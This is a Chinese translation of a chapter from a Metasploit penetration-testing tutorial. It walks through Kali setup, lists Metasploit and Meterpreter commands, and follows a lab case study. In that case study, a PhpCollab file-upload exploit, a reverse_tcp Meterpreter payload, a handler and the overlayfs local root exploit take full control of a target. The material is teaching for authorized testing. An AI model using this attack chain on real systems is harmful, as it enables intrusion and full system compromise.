1.  下载最新的 Kali VM 映像（[`images.offensive-security.com/virtual-images/kali-linux-2017.3-vm-amd64.ova`](https://images.offensive-security.com/virtual-images/kali-linux-2017.3-vm-amd64.ova)）

1.  运行 VM Player 程序，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c5eee2a7-3df7-4ad2-bfac-8f12d8b57a60.png)

1.  接下来，转到“Player”选项卡，然后选择“文件”|“打开”。

1.  浏览到提取的 Kali Linux 的`*.ova`文件并单击“打开”。我们将看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e2698050-1ddb-4ac4-9777-18e00113ccd7.png)

1.  选择任何名称并选择存储路径（我更喜欢在具有最大可用空间的驱动器上创建一个单独的文件夹），然后单击“导入”。

1.  导入可能需要一些时间。请耐心等待，同时听听您喜欢的音乐。

1.  成功导入后，我们可以在虚拟机列表中看到新添加的虚拟机，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/61a59699-ec1a-4266-bb2d-0e38764cad64.png)

1.  接下来，我们只需要启动操作系统。好消息是，预安装的 Kali Linux 的 VMware 映像随附有 VMware Tools，这使得诸如拖放、挂载共享文件夹等功能可以随时使用。

1.  Kali Linux 的默认凭据是`root`:`toor`，其中`root`是用户名，`toor`是密码。

1.  让我们快速打开一个终端并初始化和启动 Metasploit 数据库，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a6357c27-a083-4440-8b18-a1af1b2b78c0.png)

1.  通过发出`msfconsole`命令来开始 Metasploit 框架，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c389ab2b-7216-4ffb-8894-e9cb859ae339.png)

有关 Kali Linux 的完整持久安装指南，请参阅：[`docs.kali.org/category/installation`](https://docs.kali.org/category/installation)。

要在 Linux 中通过命令行安装 Metasploit，请参阅：[`www.darkoperator.com/installing-metasploit-in-ubunt/`](https://www.darkoperator.com/installing-metasploit-in-ubunt/)。

要在 Windows 上安装 Metasploit，请参考这里的优秀指南：[`www.packtpub.com/mapt/book/networking_and_servers/9781788295970/2/ch02lvl1sec20/installing-metasploit-on-windows`](https://www.packtpub.com/mapt/book/networking_and_servers/9781788295970/2/ch02lvl1sec20/installing-metasploit-on-windows)。

# Metasploit 的基础知识

自从我们回顾了渗透测试的基本阶段并完成了 Kali Linux 的设置，让我们谈谈大局；也就是 Metasploit。Metasploit 是一个安全项目，提供了漏洞利用和大量的侦察功能，以帮助渗透测试人员。Metasploit 是由 H.D. Moore 于 2003 年创建的，自那时以来，其快速发展使其被认为是最受欢迎的渗透测试工具之一。Metasploit 完全是一个由 Ruby 驱动的项目，提供了许多漏洞利用、有效载荷、编码技术和大量的后渗透功能。

Metasploit 有各种版本，如下：

+   Metasploit Pro：这个版本是商业版，提供了大量出色的功能，如 Web 应用程序扫描、利用、自动利用，非常适合专业的渗透测试人员和 IT 安全团队。Pro 版主要用于专业、高级和大型渗透测试以及企业安全项目。

+   Metasploit Express：express 版本用于基线渗透测试。这个版本的 Metasploit 包括智能利用、自动暴力破解凭据等功能。这个版本非常适合中小型公司的 IT 安全团队。

+   Metasploit 社区：这是一个免费版本，功能较 express 版本有所减少。然而，对于学生和小型企业来说，这个版本是一个有利的选择。

+   Metasploit 框架：这是一个命令行版本，包括所有手动任务，如手动利用、第三方导入等。这个版本适合开发人员和安全研究人员。

在本书中，我们将使用 Metasploit 社区和框架版本。Metasploit 还提供各种类型的用户界面，如下：

+   图形用户界面：GUI 具有所有选项，只需点击按钮即可使用。该界面提供了用户友好的界面，有助于提供更清洁的漏洞管理。

+   控制台界面：这是首选界面，也是最受欢迎的界面。这个界面提供了 Metasploit 提供的所有选项的一体化方法。这个界面也被认为是最稳定的界面。在本书中，我们将最常使用控制台界面。

+   命令行界面：命令行界面是最强大的界面。它支持启动利用活动，如有效载荷生成。然而，在使用命令行界面时记住每个命令是一项困难的工作。

+   Armitage：Raphael Mudge 的 Armitage 为 Metasploit 添加了一个酷炫的黑客风格的 GUI 界面。Armitage 提供了易于管理的漏洞管理、内置 NMAP 扫描、利用建议以及使用 Cortana 脚本语言自动化功能的能力。本书的后半部分专门介绍了 Armitage 和 Cortana。

有关 Metasploit 社区的更多信息，请参阅：[`blog.rapid7.com/2011/12/21/metasploit-tutorial-an-introduction-to-metasploit-community/`](https://blog.rapid7.com/2011/12/21/metasploit-tutorial-an-introduction-to-metasploit-community/)。

# 使用 Metasploit 进行渗透测试

在设置好 Kali Linux 之后，我们现在准备使用 Metasploit 进行第一次渗透测试。然而，在开始测试之前，让我们回顾一些 Metasploit 框架中使用的基本功能和术语。

# 回顾 Metasploit 的基础知识

在运行 Metasploit 之后，我们可以在 Metasploit 控制台中键入 help 或?来列出框架中所有可用的有用命令。让我们回顾一下 Metasploit 中使用的基本术语，如下所示：

+   **利用**: 这是一段代码，当执行时，将利用目标的漏洞。

+   **有效载荷**: 这是在成功利用后在目标上运行的代码。它定义了我们想要在目标系统上执行的操作。

+   **辅助**: 这些是提供额外功能的模块，如扫描、模糊测试、嗅探等。

+   **编码器**: 编码器用于混淆模块，以避免被防病毒软件或防火墙等保护机制检测到。

+   **Meterpreter**: Meterpreter 是一种使用内存 DLL 注入分段器的有效载荷。它提供了各种功能，可在目标上执行，这使其成为一个受欢迎的选择。

现在，让我们回顾一些我们将在本章中使用的 Metasploit 的基本命令。让我们看看它们应该做什么：

| **命令** | **用法** | **示例** |
| --- | --- | --- |
| `use [Auxiliary/Exploit/Payload/Encoder]` | 选择要开始使用的特定模块 | `msf>use exploit/unix/ftp/vsftpd_234_backdoor msf>use auxiliary/scanner/portscan/tcp` |
| `show [exploits/payloads/encoder/auxiliary/options]` | 查看特定类型的可用模块列表 | `msf>show payloads msf> show options` |
| `set [options/payload]` | 为特定对象设置值 | `msf>set payload windows/meterpreter/reverse_tcp msf>set LHOST 192.168.10.118 msf> set RHOST 192.168.10.112 msf> set LPORT 4444 msf> set RPORT 8080` |
| `setg [options/payload]` | 全局设置特定对象的值，因此在模块切换时值不会改变 | `msf>setg RHOST 192.168.10.112` |
| `run` | 在设置所有必需的选项后启动辅助模块 | `msf>run` |
| `exploit` | 启动一个利用 | `msf>exploit` |
| `back` | 取消选择模块并返回 | `msf(ms08_067_netapi)>back msf>` |
| `Info` | 列出与特定漏洞/模块/辅助相关的信息 | `msf>info exploit/windows/smb/ms08_067_netapi msf(ms08_067_netapi)>info` |
| `Search` | 查找特定模块 | `msf>search hfs` |
| `check` | 检查特定目标是否容易受到攻击 | `msf>check` |
| `Sessions` | 列出可用的会话 | `msf>sessions [session number]` |

让我们来看看基本的 Meterpreter 命令：

| **Meterpreter 命令** | **用法** | **示例** |
| --- | --- | --- |
| `sysinfo` | 列出受损主机的系统信息 | `meterpreter>sysinfo` |
| `ifconfig` | 列出受损主机上的网络接口 | `meterpreter>ifconfig meterpreter>ipconfig (Windows)` |
| `arp` | 列出连接到目标的主机的 IP 和 MAC 地址 | `meterpreter>arp` |
| `background` | 将活动会话发送到后台 | `meterpreter>background` |
| `shell` | 在目标上放置一个 cmd shell | `meterpreter>shell` |
| `getuid` | 获取当前用户的详细信息 | `meterpreter>getuid` |
| `getsystem` | 提升权限并获得 SYSTEM 访问权限 | `meterpreter>getsystem` |
| `getpid` | 获取 meterpreter 访问的进程 ID | `meterpreter>getpid` |
| `ps` | 列出目标上运行的所有进程 | `meterpreter>ps` |

既然我们现在回顾了 Metasploit 命令的基础知识，让我们在下一节看看使用 Metasploit 相对于传统工具和脚本的好处。

如果您是第一次使用 Metasploit，请参考[`www.offensive-security.com/metasploit-unleashed/msfconsole-commands/`](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)获取有关基本命令的更多信息。

# 使用 Metasploit 进行渗透测试的好处

在我们深入研究一个未知网络之前，我们必须知道为什么我们更喜欢 Metasploit 而不是手动利用技术。这是因为它给人一种黑客般的终端外观，还是有其他原因？与传统的手动技术相比，Metasploit 是一个更可取的选择，因为它具有以下几个方面的特点。

# 开源

选择 Metasploit 框架的首要原因之一是因为它是开源的，并且在积极开发中。还有其他一些高薪工具用于进行渗透测试。然而，Metasploit 允许用户访问其源代码并添加自定义模块。Metasploit 的专业版是收费的，但出于学习的目的，大多数人更喜欢社区版。

# 支持测试大型网络和自然的命名约定

使用 Metasploit 很容易。然而，在这里，易用性指的是命令的自然命名约定。Metasploit 在进行大规模网络渗透测试时提供了极大的便利。考虑一个情景，我们需要测试一个拥有 200 台系统的网络。与其逐个检查每个系统，不如使用 Metasploit 自动检查整个范围。使用子网和 CIDR 值等参数，Metasploit 测试所有系统以利用漏洞，而使用手动技术，我们可能需要手动对 200 台系统启动 exploit。因此，Metasploit 节省了大量的时间和精力。

# 智能负载生成和切换机制

最重要的是，在 Metasploit 中切换负载很容易。Metasploit 提供了使用 `set payload` 命令快速更改负载的途径。因此，将 Meterpreter 或基于 shell 的访问转换为更具体的操作，比如添加用户和获取远程桌面访问，变得容易。通过使用命令行中的 `msfvenom` 应用程序，生成用于手动利用的 shellcode 也变得容易。

# 更干净的退出

Metasploit 也负责从其 compromise 的系统中更干净地退出。另一方面，自定义编码的 exploit 在退出操作时可能会导致系统崩溃。在我们知道服务不会立即重新启动的情况下，干净地退出确实是一个重要因素。

考虑一个情景，我们已经 compromise 了一个 web 服务器，当我们准备离开时，被攻击的应用程序崩溃了。服务器的预定维护时间还剩下 50 天。那么，我们该怎么办？难道要等待接下来的 50 天，等服务再次上线，这样我们才能再次利用它吗？而且，如果服务在被修补后再次上线呢？我们可能会后悔莫及。这也显示了测试技能不足的明显迹象。因此，更好的方法是使用 Metasploit 框架，它以更干净的方式退出，并提供大量的后渗透功能，比如持久性，可以帮助保持对服务器的永久访问。

# GUI 环境

Metasploit 提供友好的 GUI 和第三方接口，比如 Armitage。这些接口通过提供易于切换的工作空间、即时漏洞管理和一键功能来简化渗透测试项目。我们将在本书的后面章节更多地讨论这些环境。

# 案例研究 - 深入研究未知网络

回顾 Metasploit 的基础知识，我们已经准备好使用 Metasploit 进行第一次渗透测试。考虑一个现场场景，我们被要求测试一个 IP 地址并检查它是否容易受到攻击。这次测试的唯一目的是确保所有适当的检查是否已经就位。情景非常简单。我们假设所有的前期交互都已经与客户完成，并且实际的测试阶段即将开始。

如果您想在阅读案例研究的同时进行实际操作，请参考*重新访问案例研究*部分，因为这将帮助您模拟具有精确配置和网络详细信息的整个案例研究。

# 情报收集

正如前面讨论的，情报收集阶段围绕着尽可能收集有关目标的信息。这包括进行主动和被动扫描，其中包括端口扫描、横幅抓取和各种其他扫描。当前情景下的目标是一个单个 IP 地址，所以在这里，我们可以跳过收集被动信息，只能继续使用主动信息收集方法。

让我们从足迹识别阶段开始，其中包括端口扫描、横幅抓取、ping 扫描以检查系统是否存活以及服务检测扫描。

进行足迹识别和扫描时，Nmap 被证明是可用的最好工具之一。Nmap 生成的报告可以轻松导入 Metasploit。然而，Metasploit 具有内置的 Nmap 功能，可以用于从 Metasploit 框架控制台执行 Nmap 扫描并将结果存储在数据库中。

有关 Nmap 扫描的更多信息，请参考[`nmap.org/bennieston-tutorial/`](https://nmap.org/bennieston-tutorial/)。

请参考一本关于 Nmap 的优秀书籍：[`www.packtpub.com/networking-and-servers/nmap-6-network-exploration-and-security-auditing-cookbook`](https://www.packtpub.com/networking-and-servers/nmap-6-network-exploration-and-security-auditing-cookbook)。

# 在 Metasploit 中使用数据库

在进行渗透测试时，自动存储结果总是更好的方法。使用数据库将帮助我们建立主机、服务和渗透测试范围内的漏洞的知识库。为了实现这个功能，我们可以在 Metasploit 中使用数据库。将数据库连接到 Metasploit 还可以加快搜索速度并提高响应时间。下面的截图显示了当数据库未连接时的搜索：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/59a5e431-9dde-4408-82e8-9378e7f9ed4a.png)

我们在安装阶段看到了如何初始化 Metasploit 数据库并启动它。要检查 Metasploit 当前是否连接到数据库，我们只需输入`db_status`命令，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c6c36c6b-2fdf-49a3-8838-aa834147f1d9.png)

可能会出现我们想要连接到一个单独的数据库而不是默认的 Metasploit 数据库的情况。在这种情况下，我们可以使用`db_connect`命令，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ddc5df69-c2a4-48db-a254-908224b13cd6.png)

要连接到数据库，我们需要提供用户名、密码和端口以及`db_connect`命令的数据库名称。

让我们看看其他核心数据库命令应该做什么。下表将帮助我们理解这些数据库命令：

| **命令** | **用法信息** |
| --- | --- |
| `db_connect` | 该命令用于与默认数据库以外的其他数据库进行交互 |
| `db_export` | 该命令用于导出数据库中存储的整套数据，以便创建报告或作为另一个工具的输入 |
| `db_nmap` | 该命令用于使用 Nmap 扫描目标，并将结果存储在 Metasploit 数据库中 |
| `db_status` | 该命令用于检查数据库连接是否存在 |
| `db_disconnect` | 该命令用于断开与特定数据库的连接 |
| `db_import` | 该命令用于从 Nessus、Nmap 等其他工具导入结果 |
| `db_rebuild_cache` | 该命令用于重新构建缓存，如果先前的缓存损坏或存储有旧的结果 |

开始新的渗透测试时，最好将先前扫描的主机及其相应的数据与新的渗透测试分开，以免混在一起。在开始新的渗透测试之前，我们可以在 Metasploit 中使用`workspace`命令来做到这一点，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/992ce225-e045-402f-9794-1c9fadd34ce3.png)

要添加一个新的工作空间，我们可以使用`workspace -a`命令，后面跟着一个标识符。我们应该将标识符保持为当前正在评估的组织的名称，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8312e160-70e6-4f67-bc30-e5097c01cfc8.png)

我们可以看到，我们已经成功使用`-a`开关创建了一个新的工作空间。让我们通过简单地发出`workspace`命令，后面跟着工作空间名称，来切换工作空间，如前面的屏幕截图所示。有了工作空间，让我们快速对目标 IP 进行 Nmap 扫描，看看是否有一些有趣的服务在运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/33d0d7e5-3a8e-4f8c-8388-ee15b9fce3fd.png)

扫描结果让人心碎。除了端口`80`上没有运行任何服务外，目标上没有运行任何服务。

默认情况下，Nmap 只扫描前 1000 个端口。我们可以使用`-p-`开关扫描所有的 65535 个端口。

由于我们连接到了 Metasploit 数据库，我们检查的所有内容都会被记录到数据库中。发出`services`命令将从数据库中填充所有扫描到的服务。此外，让我们通过`db_nmap`使用`-sV`开关执行版本检测扫描，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d3ef9b41-45d1-4519-a687-b14da9fa1f81.png)

先前的 Nmap 扫描发现了端口`80`并将其记录在数据库中。然而，版本检测扫描发现了在端口`80`上运行的服务，即 Apache 2.4.7 Web 服务器，找到了 MAC 地址、操作系统类型，并更新了数据库中的条目，如前面的屏幕截图所示。由于获取访问权限需要明确针对软件特定版本的精确利用，因此始终要对版本信息进行双重检查。Metasploit 包含一个用于 HTTP 版本指纹识别的内置辅助模块。让我们使用它，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b5521030-a0e9-49ff-8721-d8257a058e20.png)

要启动`http_version`扫描器模块，我们发出`use`命令，后面跟着模块的路径，即`auxiliary/scanner/http/http_version`。所有基于扫描的模块都有`RHOSTS`选项，用于包含广泛的 IP 地址和子网。然而，由于我们只测试单个 IP 目标，我们使用`set`命令将`RHOSTS`指定为目标 IP 地址，即`192.168.174.132`。接下来，我们只需使用`run`命令执行模块，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c238b2cf-e780-4ec5-a79c-b792fd540cf6.png)

这个版本的 Apache 正是我们在先前的 Nmap 扫描中发现的版本。运行在目标上的这个版本的 Apache Web 服务器是安全的，在`exploit-db.com`和`0day.today`等利用数据库中都没有公开的利用。因此，我们别无选择，只能寻找 Web 应用程序中的漏洞，如果有的话。让我们尝试浏览这个 IP 地址，看看我们能否找到一些东西：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/03412237-5930-4818-99d0-4c01b12e26e5.png)

好吧！我们有一个索引页面，但没有内容。让我们尝试使用 Metasploit 的`dir_scanner`模块来查找一些已知目录，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1c6a3800-aebf-4976-b856-2461af7a8824.png)

加载`auxiliary/scanner/http/dir_scanner`模块后，让我们通过设置`DICTIONARY`参数中的路径来提供包含已知目录列表的字典文件。此外，我们可以通过将`THREADS`参数从`1`增加到`20`来加快进程。让我们运行模块并分析输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/16c96d27-e889-4d4c-95f2-e48bf9f66679.png)

在单个目录条目之间的空格字符产生了很多误报。然而，我们从`phpcollab`目录得到了 302 响应代码，这表明在尝试访问`phpcollab`目录时，模块收到了重定向响应（302）。响应很有趣；让我们看看当我们尝试从浏览器打开`phpcollab`目录时会得到什么：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eb205077-f438-4f41-9da7-d88e6649c5ed.png)

很好！我们有一个基于 PHP 的应用程序正在运行。因此，我们在 Metasploit 模块中得到了 302 响应。

# 威胁建模

从情报收集阶段，我们可以看到目标系统上只有端口`80`是开放的，并且运行在上面的应用程序不容易受到攻击，正在运行 PhpCollab Web 应用程序。尝试一些随机密码和用户名来访问 PhpCollab 门户没有成功。即使搜索 Metasploit，我们也没有 PhpCollab 的模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/56c38e6d-d50c-41b4-a6bd-84f89ade6bc8.png)

让我们尝试使用`searchsploit`工具从[`exploit-db.com/`](https://exploit-db.com/)搜索 PhpCollab。searchsploit 允许您轻松搜索托管在 exploit 数据库网站上的所有漏洞，因为它维护了所有漏洞的离线副本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0197412f-009d-4d48-9688-fe83737d69c5.png)

哇！我们有一个 PhpCollab 的漏洞利用，好消息是它已经在 Metasploit 漏洞利用格式中。

# 漏洞分析 - 任意文件上传（未经身份验证）

PhpCollab 应用程序没有正确过滤上传文件的内容。因此，未经身份验证的攻击者可以上传恶意文件并运行任意代码。

# 对 PhpCollab 2.5.1 应用程序的攻击机制

如果攻击者通过在`/clients/editclient.php?id=1&action=update` URL 上发送`POST`请求上传恶意的 PHP 文件，应用程序可能会受到威胁。代码没有验证请求是否来自经过身份验证的用户。有问题的代码如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/74987986-281a-4153-a29f-74d7a6d7524f.png)

从第 2 行，我们可以看到上传的文件以`$id`后跟`$extention`的形式保存在`logos_clients`目录中，这意味着由于我们在 URL 中有`id=1`，上传的后门将保存为`1.php`在`logos_clients`目录中。

有关此漏洞的更多信息，请参阅：[`sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/`](https://sysdream.com/news/lab/2017-09-29-cve-2017-6090-phpcollab-2-5-1-arbitrary-file-upload-unauthenticated/)。

# 利用和获取访问权限

为了访问目标，我们需要将此漏洞利用复制到 Metasploit 中。然而，直接将外部漏洞利用复制到 Metasploit 的漏洞利用目录是不鼓励的，也是不良实践，因为您将在每次更新时丢失模块。最好将外部模块保存在一个通用目录中，而不是 Metasploit 的`modules`目录。然而，保持模块的最佳方法是在系统的其他地方创建类似的目录结构，并使用`loadpath`命令加载它。让我们将找到的模块复制到某个目录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/017e243f-2795-4d0d-9601-5e7cf1ff2c73.png)

让我们创建目录结构，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/99eda91e-0276-4817-8bfb-775dd17f5eb0.png)

我们可以看到，我们在`MyModules`文件夹中创建了一个 Metasploit 友好的结构，即`modules/exploits/nipun`，并将漏洞也移动到了该目录中。让我们按照以下步骤将此结构加载到 Metasploit 中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/136576fe-aa6f-4577-83d3-de8fbb989fa8.png)

我们已成功将漏洞加载到 Metasploit 中。让我们使用模块，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c62bb5cb-bc08-488a-a81b-23088997df3f.png)

该模块要求我们设置远程主机的地址、远程端口和 PhpCollab 应用程序的路径。由于路径（`TARGETURI`）和远程端口（`RPORT`）已经设置好了，让我们将`RHOST`设置为目标的 IP 地址，并发出`exploit`命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/81cc995e-f14d-4929-85d9-77f80f484310.png)

哇！我们已经访问了系统。让我们使用一些基本的后期利用命令并分析输出，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3d21f6bb-7394-414b-a08d-4f01f2a36c2b.png)

正如我们在前面的截图中所看到的，运行`sysinfo`命令可以获取系统的信息，如计算机名称、操作系统、架构（64 位版本）和 Meterpreter 版本（基于 PHP 的 Meterpreter）。让我们使用`shell`命令在受损主机上进入系统 shell，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/91f91844-a74d-49c7-9fa8-176457be5f11.png)

我们可以看到，一旦我们进入系统 shell，运行诸如`id`之类的命令会提供我们当前用户正在使用的输入，即`www-data`，这意味着要完全控制该系统，我们需要 root 权限。此外，发出`lsb_release -a`命令会输出具有确切版本和代号的操作系统版本。让我们记下它，因为在获取对系统的 root 访问权限时会需要。然而，在我们继续进行 root 操作之前，让我们从系统中获取一些基本信息，例如使用`getpid`命令获取当前进程 ID，使用`getuid`命令获取当前用户 ID，用于唯一用户标识符的`uuid`和用于受损机器的`machine_id`。让我们运行我们刚刚讨论的所有命令并分析输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d8dc37ab-1348-4ad1-aa25-6a7b3765cd6f.png)

我们得到的信息相当直接。我们有当前进程的 ID，我们的 Meterpreter 所在的用户 ID，UUID 和机器 ID。然而，这里需要注意的一点是，我们的访问是基于 PHP Meterpreter 的，而 PHP Meterpreter 的限制是我们无法运行特权命令，这些命令可以很容易地由更具体的二进制 Meterpreter shells（如**reverse TCP**）提供。首先，让我们升级到更具体的 shell，以获得更好的目标访问级别。我们将使用`msfvenom`命令创建一个恶意载荷；然后我们将上传到目标系统并执行它。让我们开始吧：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7e9ec54d-c293-4442-b74b-d40e034affc5.png)

由于我们的受损主机正在运行 64 位架构，我们将使用 Meterpreter 的 64 位版本，如前面的屏幕截图所示。MSFvenom 根据我们的要求生成强大的有效载荷。我们使用`-p`开关指定有效载荷，它就是`linux/x64/meterpreter/reverse_tcp`。这个有效载荷是 64 位 Linux 兼容的 Meterpreter 有效载荷，一旦在受损系统上执行，它将连接回我们的监听器，并为我们提供对机器的访问权限。由于有效载荷必须连接回我们，它应该知道要连接到哪里。出于这个原因，我们指定了`LHOST`和`LPORT`选项，其中`LHOST`作为我们监听器运行的 IP 地址，`LPORT`指定监听器的端口。我们将在 Linux 机器上使用有效载荷。因此，我们指定格式（`-f`）为 elf，这是 Linux 操作系统的默认可执行二进制格式。`-b`选项用于指定可能在通信中遇到问题并可能破坏 shellcode 的不良字符。有关不良字符及其规避的更多信息将在接下来的章节中介绍。最后，我们将有效载荷写入`reverse_connect.elf`文件。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2d3cddca-d312-4af3-a290-e2314d390641.png)

接下来，由于我们已经在机器上拥有了一个 PHP Meterpreter 访问权限，让我们使用`upload`命令上传新创建的有效载荷，如前面的屏幕截图所示。我们可以通过发出`pwd`命令来验证上传的当前路径，这表示我们正在使用的当前目录。一旦执行了上传的有效载荷，它将连接回我们的系统。然而，我们在接收端也需要一些东西来处理连接。让我们运行一个处理程序来处理传入的连接，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/562d9ce6-42bd-4630-8055-113fcc934c3b.png)

我们可以看到，我们使用`background`命令将 PHP Meterpreter 会话推送到后台。让我们使用`exploit/multi/handler`模块，并设置与`reverse_connect.elf`中使用的相同的有效载荷、LHOST 和 LPORT，然后使用`exploit`命令运行该模块。

使用`-j`命令利用后台模式启动处理程序作为作业，并可以处理多个连接，全部在后台进行。

我们已成功设置了处理程序。接下来，我们只需要在目标上执行有效载荷文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/739c2ed3-fab4-4bb9-a638-f7c72d76d3f7.png)

我们可以看到，我们刚刚使用 shell 命令放置了一个 shell。我们使用`pwd`命令检查了目标上的当前工作目录。接下来，我们给有效载荷文件赋予了可执行权限，以便我们可以执行它，最后，我们使用`&`标识符在后台运行了`reverse_connect.elf`可执行文件。前面的屏幕截图显示，我们一旦运行可执行文件，就会打开一个新的 Meterpreter 会话到目标系统。使用`sessions -i`命令，我们可以看到我们现在在目标上有两个 Meterpreter：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0ff224d2-8ec1-4b33-bdfe-28d24cf0113c.png)

然而，x64/Linux Meterpreter 显然比 PHP Meterpreter 更好，我们将继续通过这个 Meterpreter 与系统交互，除非我们获得了更高权限的 Meterpreter。但是，如果出现意外情况，我们可以切换访问到 PHP Meterpreter 并重新运行这个 payload，就像我们刚刚做的那样。这里的一个重要点是，无论我们在目标上获得了更好的访问级别，我们仍然是低权限用户，我们希望改变这一点。Metasploit 框架包含一个名为`local_exploit_suggester`的优秀模块，它有助于提升权限。它具有内置机制来检查各种本地提权利用，并建议在目标上使用最佳的利用。我们可以加载这个模块，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/996299b9-53ce-4301-8889-348b0bd734b2.png)

我们使用`use`命令加载了模块，后面跟着模块的绝对路径，即`post/multi/recon/local_exploit_suggester`。由于我们想在目标上使用这个 exploit，我们自然会选择更好的 Meterpreter 来路由我们的检查。因此，我们将`SESSION`设置为`2`，以通过`SESSION 2`路由我们的检查，这是 x64/Linux Meterpreter 的标识符。让我们运行这个模块并分析输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c3f1c595-797e-454c-93f1-1b86eb763ea3.png)

太神奇了！我们可以看到`suggester`模块表明`exploit/linux`目录中的`overlayfs_priv_esc`本地利用模块可以在目标上用于获取 root 访问权限。但是，我把它留给你们来完成。让我们手动在目标上下载本地 root exploit，编译并执行它以获取目标系统的 root 访问权限。我们可以从以下网址下载 exploit：[`www.exploit-db.com/exploits/37292`](https://www.exploit-db.com/exploits/37292)。但是，让我们在下一节中收集一些关于这个 exploit 的细节。

# 使用本地 root exploit 提升权限

`overlayfs`提权漏洞允许本地用户利用允许在任意挂载的命名空间中使用`overlayfs`的配置来获取 root 权限。这个漏洞存在的原因是`overlayfs`的实现没有正确检查在上层文件系统目录中创建文件的权限。

有关漏洞的更多信息可以在这里找到：[`www.cvedetails.com/cve/cve-2015-1328`](https://www.cvedetails.com/cve/cve-2015-1328)。

让我们进入一个 shell，并从[`www.exploit-db.com/`](https://www.exploit-db.com/)下载原始 exploit 到目标上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/096d3a2b-1b40-490d-b44b-f69e38cb21d6.png)

让我们将漏洞从`37292`重命名为`37292.c`，并使用`gcc`编译它，这将生成一个可执行文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/74813d36-9dd8-4362-800e-09d18c321342.png)

我们可以看到我们成功编译了 exploit，让我们运行它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a4a6f531-5d8d-4327-9d70-f2bc11eb014d.png)

太棒了！正如我们所看到的，通过运行 exploit，我们已经获得了对 root shell 的访问；这标志着对这个系统的完全妥协。让我们运行一些基本命令并确认我们的身份：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3a5f3ba6-25b8-4504-afbb-09cf007ac055.png)

记住，我们在后台运行了一个 exploit handler？让我们运行相同的`reverse_connect.elf`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e0d5504e-da05-4bec-8f9b-43450ffa4bc4.png)

又打开了一个 Meterpreter 会话！让我们看看这个 Meterpreter 与其他两个有何不同：

